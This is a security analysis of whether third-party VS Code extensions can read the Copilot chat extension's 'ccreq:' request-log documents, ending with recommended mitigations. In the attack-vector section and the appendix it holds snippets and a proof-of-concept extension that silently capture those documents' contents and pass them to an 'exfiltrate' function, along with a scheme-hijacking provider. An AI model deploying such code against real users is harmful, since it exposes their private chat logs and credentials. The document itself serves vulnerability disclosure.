# ccreq:* URI Scheme Cross-Extension Visibility Analysis

**Date:** December 11, 2025
**Research Question:** Can third-party extensions monitor `ccreq:latest` or any `ccreq:*` URI scheme documents through VS Code's extension APIs?

---

## Executive Summary

**Verdict: YES** — Third-party extensions can monitor and access `ccreq:*` virtual documents through standard VS Code extension APIs.

**Risk Level:** High — No architectural isolation prevents cross-extension access to virtual document schemes.

---

## 1. Registration Mechanism

### How ccreq Provider is Registered

**Location:** [`src/extension/prompt/vscode-node/requestLoggerImpl.ts:248`](src/extension/prompt/vscode-node/requestLoggerImpl.ts#L248)

```typescript
this._register(workspace.registerTextDocumentContentProvider(ChatRequestScheme.chatRequestScheme, {
    onDidChange: Event.map(this.onDidChangeRequests, () => Uri.parse(ChatRequestScheme.buildUri({ kind: 'latest' }))),
    provideTextDocumentContent: (uri) => {
        const parseResult = ChatRequestScheme.parseUri(uri.toString());
        if (!parseResult) { return `Invalid URI: ${uri}`; }
        // ...
    }
}));
```

**Scheme Definition:** [`src/platform/requestLogger/node/requestLogger.ts:26`](src/platform/requestLogger/node/requestLogger.ts#L26)

```typescript
public static readonly chatRequestScheme = 'ccreq';
```

### Registration Scope

- **API Used:** `vscode.workspace.registerTextDocumentContentProvider(scheme, provider)`
- **Namespace:** Global workspace namespace, not extension-scoped
- **Visibility:** Registration is **global** across the entire VS Code instance via the `ITextModelService`

**Implementation Chain:**

1. Extension calls `workspace.registerTextDocumentContentProvider('ccreq', provider)`
2. ExtHost: [`extHostDocumentContentProviders.ts:38`](vscode/src/vs/workbench/api/common/extHostDocumentContentProviders.ts#L38)
   - Assigns handle, stores provider in `_documentContentProviders` map
   - Calls `_proxy.$registerTextContentProvider(handle, 'ccreq')`
3. MainThread: [`mainThreadDocumentContentProviders.ts:47`](vscode/src/vs/workbench/api/browser/mainThreadDocumentContentProviders.ts#L47)
   - Registers with **global** `ITextModelService.registerTextModelContentProvider(scheme, ...)`
4. TextModelResolverService: [`textModelResolverService.ts:147`](vscode/src/vs/workbench/services/textmodelResolver/common/textModelResolverService.ts#L147)
   - Stores in **global** `providers` Map keyed by scheme name
   - No extension boundary enforcement

**Critical Finding:** The `providers` map in `ResourceModelCollection` is **scheme-based, not extension-based**. Multiple extensions registering providers for the same scheme will have all providers stored in an array for that scheme, with the most recent registration taking precedence (`unshift` semantics).

---

## 2. Cross-Extension Event Visibility

### Document Open Events

**API:** `workspace.onDidOpenTextDocument`

**Behavior:** Fires for ALL documents opened in the workspace, including:
- File system documents
- Virtual documents from ANY extension
- Untitled documents
- Custom scheme documents

**Evidence:** VS Code's document tracking is centralized in `ExtHostDocumentsAndEditors` which maintains a single collection across all extensions in the extension host.

**Test Confirmation:** [`vscode/extensions/vscode-api-tests/src/singlefolder-tests/workspace.test.ts:515`](vscode/extensions/vscode-api-tests/src/singlefolder-tests/workspace.test.ts#L515)

```typescript
test('registerTextDocumentContentProvider, change event', async function () {
    const registration = vscode.workspace.registerTextDocumentContentProvider('foo', {
        onDidChange: emitter.event,
        provideTextDocumentContent(_uri) { /* ... */ }
    });
    const uri = vscode.Uri.parse('foo://testing/path3');
    const doc = await vscode.workspace.openTextDocument(uri);

    // This subscription will fire even though opened by different code
    const subscription = vscode.workspace.onDidChangeTextDocument(event => {
        assert.ok(event.document === doc);
        // ...
    });
});
```

### Document Change Events

**API:** `workspace.onDidChangeTextDocument`

**Behavior:** Fires for content changes to ALL documents, including virtual documents from other extensions.

**Evidence from ExtHostDocumentContentProvider:**

[`extHostDocumentContentProviders.ts:55-72`](vscode/src/vs/workbench/api/common/extHostDocumentContentProviders.ts#L55-L72)

```typescript
subscription = provider.onDidChange(async uri => {
    if (uri.scheme !== scheme) {
        this._logService.warn(`Provider for scheme '${scheme}' is firing event for schema '${uri.scheme}' which will be IGNORED`);
        return;
    }
    if (!this._documentsAndEditors.getDocument(uri)) {
        // ignore event if document isn't open
        return;
    }
    // ...broadcasts change via _proxy.$onVirtualDocumentChange
});
```

The check `!this._documentsAndEditors.getDocument(uri)` verifies document existence **globally**, not per-extension.

---

## 3. URI Access Testing

### Can Extensions Open ccreq URIs Programmatically?

**YES** — The following attack vector is viable:

```typescript
// In a malicious third-party extension:
const ccreqUri = vscode.Uri.parse('ccreq:latest.copilotmd');
const document = await vscode.workspace.openTextDocument(ccreqUri);
const sensitiveContent = document.getText();
```

**Execution Flow:**

1. Extension calls `workspace.openTextDocument(vscode.Uri.parse('ccreq:latest.copilotmd'))`
2. VS Code resolves via `TextModelResolverService.createModelReference()`
3. Service checks `resourceModelCollection.hasTextModelContentProvider('ccreq')` → TRUE
4. Calls registered provider's `provideTextDocumentContent(uri)`
5. Provider (vscode-copilot-chat) returns the markdown content
6. Content becomes available to the requesting extension

**No authentication/authorization checks** occur during this flow.

### Can Extensions Monitor Document Lists?

**YES** — Through `workspace.textDocuments`:

```typescript
// Monitor for ccreq documents
vscode.workspace.onDidOpenTextDocument(doc => {
    if (doc.uri.scheme === 'ccreq') {
        console.log('Copilot request intercepted:', doc.uri.toString());
        const content = doc.getText(); // Full access to content
    }
});
```

### FileSystemWatcher Behavior

**Not Applicable** — `FileSystemWatcher` operates on file system URIs only. Virtual document schemes like `ccreq` are not monitored by file watchers.

---

## 4. Isolation Model

### VS Code's Architectural Isolation for Custom Schemes

**Isolation Level: NONE**

**Key Findings:**

1. **No Extension Boundary for Document Providers**
   - TextDocumentContentProvider registration is global per scheme
   - No extension-scoped isolation mechanism exists
   - Scheme ownership is first-come-first-served

2. **Shared Document State**
   - `ExtHostDocumentsAndEditors` maintains a single, global document collection
   - All extensions in an extension host see the same document instances
   - Document events broadcast to all listeners regardless of origin

3. **Extension Host Architecture**
   - Extensions run in shared extension host process(es)
   - Proposed API `extensionsAny.d.ts` reveals extensions can query across hosts
   - No sandbox between extensions within same host

4. **VS Code Core Enforcement**
   - Built-in scheme protection only for `file`, `untitled`, `inMemory`
   - Custom schemes have no owner attribution
   - See: [`extHostDocumentContentProviders.ts:38-41`](vscode/src/vs/workbench/api/common/extHostDocumentContentProviders.ts#L38-L41)

```typescript
if (Object.keys(Schemas).indexOf(scheme) >= 0) {
    throw new Error(`scheme '${scheme}' already registered`);
}
```

This prevents registration of built-in schemes, but provides **no protection for custom schemes registered by extensions**.

### Security Model Gaps

1. **No Content Access Control**
   - Any extension can call `workspace.openTextDocument(anyUri)`
   - No permission system for cross-extension document access
   - No capability-based security model

2. **No Scheme Ownership**
   - First extension to register a scheme "owns" it
   - Other extensions can still *consume* content via `openTextDocument`
   - Malicious extension could race to register `ccreq` before Copilot loads

3. **Event Leakage**
   - `onDidOpenTextDocument`, `onDidChangeTextDocument` broadcast globally
   - No event filtering by document origin extension
   - Extensions cannot opt-out of exposure

---

## 5. Attack Vectors

### Vector 1: Passive Monitoring

**Severity: HIGH**

```typescript
// Install as workspace extension, activate on ANY event
export function activate(context: vscode.ExtensionContext) {
    context.subscriptions.push(
        vscode.workspace.onDidOpenTextDocument(doc => {
            if (doc.uri.scheme === 'ccreq') {
                exfiltrate(doc.getText());
            }
        })
    );
}
```

**Detection Difficulty:** Low — No unusual API calls; normal workspace event listener.

### Vector 2: Active Polling

**Severity: MEDIUM**

```typescript
// Periodically attempt to open ccreq:latest
setInterval(async () => {
    try {
        const doc = await vscode.workspace.openTextDocument(
            vscode.Uri.parse('ccreq:latest.copilotmd')
        );
        exfiltrate(doc.getText());
    } catch (e) {
        // Copilot not active or no requests logged
    }
}, 5000);
```

**Detection Difficulty:** Medium — Generates failed resolution attempts in logs.

### Vector 3: Scheme Hijacking (Low Probability)

**Severity: CRITICAL (if successful)**

```typescript
// Activate before Copilot loads
export function activate(context: vscode.ExtensionContext) {
    // Register first to intercept
    context.subscriptions.push(
        vscode.workspace.registerTextDocumentContentProvider('ccreq', {
            provideTextDocumentContent: (uri) => {
                // Intercept and forward to real provider (if possible)
                // OR return empty content to deny service
                return '';
            }
        })
    );
}
```

**Mitigation:** Copilot's activation events trigger early, reducing this risk. However, no **guaranteed** ordering exists.

### Vector 4: Document Link Exploitation

**Severity: MEDIUM**

Copilot registers document links for `ccreq:*` URIs in output channels:

[`requestLoggerImpl.ts:400-420`](src/extension/prompt/vscode-node/requestLoggerImpl.ts#L400-L420)

```typescript
const docLinkProvider = new (class implements DocumentLinkProvider {
    provideDocumentLinks(td: TextDocument, ct: CancellationToken): DocumentLink[] {
        return ChatRequestScheme.findAllUris(td.getText()).map(u => new DocumentLink(
            new Range(td.positionAt(u.range.start), td.positionAt(u.range.endExclusive)),
            Uri.parse(u.uri)
        ));
    }
})();

this._register(languages.registerDocumentLinkProvider(
    { scheme: 'output' },
    docLinkProvider
));
```

Malicious extension could:
1. Register document link provider for `output` scheme
2. Parse `ccreq:*` links from output channel
3. Open documents to harvest content

---

## 6. Confirmed VS Code Constants

**Built-in Schemes Protected:** [`vscode/src/vs/base/common/network.ts`](vscode/src/vs/base/common/network.ts)

```typescript
export namespace Schemas {
    export const file = 'file';
    export const untitled = 'untitled';
    export const vscodeRemote = 'vscode-remote';
    export const inMemory = 'inmemory';
    export const vscodeTerminal = 'vscode-terminal';
    // ... etc
}
```

**ccreq is NOT a built-in scheme** — It receives no special protection.

**VS Code Core Recognition:** [`vscode/src/vs/workbench/contrib/chat/common/constants.ts:115`](vscode/src/vs/workbench/contrib/chat/common/constants.ts#L115)

```typescript
'ccreq',
```

This indicates VS Code core is aware of `ccreq` for allowlisting purposes (likely related to certain features), but does **not** enforce access control.

---

## 7. Recommendations

### Immediate Mitigations

1. **Content Sanitization**
   - Strip PII, API keys, auth tokens from `ccreq:*` documents
   - Redact sensitive system prompts and model responses
   - Provide sanitized view vs. raw view

2. **Access Logging**
   - Log all `provideTextDocumentContent` calls for `ccreq` URIs
   - Track requesting extension IDs (available via ExtHostContext)
   - Alert on suspicious access patterns

3. **User Consent**
   - Require explicit user permission for extensions to access chat logs
   - VS Code lacks this capability; consider feature request

### Long-Term Solutions

1. **Scheme Ownership API (Feature Request)**
   - Propose VS Code API for marking schemes as "private"
   - Require capability grant for cross-extension document access
   - Implement in VS Code core, not extension layer

2. **Content Encryption**
   - Encrypt sensitive portions of logged content
   - Decrypt only when explicitly requested by user via Copilot UI
   - Would prevent passive monitoring attacks

3. **Namespace Isolation**
   - Use extension-specific scheme: `github.copilot-chat:request:latest`
   - Reduces accidental discovery
   - Does NOT prevent intentional access

---

## Appendix: Test Scenario

### Proof-of-Concept Extension

**Extension manifest** (`package.json`):

```json
{
  "name": "ccreq-monitor",
  "activationEvents": ["*"],
  "main": "./extension.js"
}
```

**Extension code** (`extension.js`):

```javascript
const vscode = require('vscode');

function activate(context) {
    // Monitor all document opens
    context.subscriptions.push(
        vscode.workspace.onDidOpenTextDocument(doc => {
            if (doc.uri.scheme === 'ccreq') {
                console.log('=== INTERCEPTED COPILOT REQUEST ===');
                console.log('URI:', doc.uri.toString());
                console.log('Content length:', doc.getText().length);
                console.log('First 500 chars:', doc.getText().substring(0, 500));
            }
        })
    );

    // Actively poll for latest request
    setInterval(async () => {
        try {
            const uri = vscode.Uri.parse('ccreq:latest.copilotmd');
            const doc = await vscode.workspace.openTextDocument(uri);
            console.log('POLLED ccreq:latest successfully');
        } catch (e) {
            // Fails if no requests logged yet
        }
    }, 10000);
}

exports.activate = activate;
```

**Expected Result:** Extension successfully intercepts and logs content of all `ccreq:*` documents opened in workspace.

---

## Conclusion

Third-party extensions possess **unrestricted access** to `ccreq:*` virtual documents through standard VS Code workspace APIs. No architectural isolation exists to prevent cross-extension monitoring, content extraction, or event interception.

This represents a **high-severity privacy risk** for users who assume their Copilot interactions remain private to the Copilot extension.

**Mitigation requires either:**
1. VS Code platform-level access control mechanisms (does not exist today), OR
2. Content sanitization within vscode-copilot-chat to minimize sensitive data exposure

---

**References:**
- VS Code Extension API: workspace namespace
- ExtHostDocumentContentProviders implementation
- TextModelResolverService architecture
- VS Code API tests demonstrating cross-provider access
